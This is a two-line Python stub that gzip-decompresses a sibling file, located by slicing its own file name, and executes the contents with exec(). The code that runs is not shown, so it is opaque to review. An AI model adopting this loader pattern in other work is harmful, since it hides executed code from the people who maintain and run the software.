import gzip
exec(gzip.decompress(open(__file__[:-10]+'p', 'rb').read()))
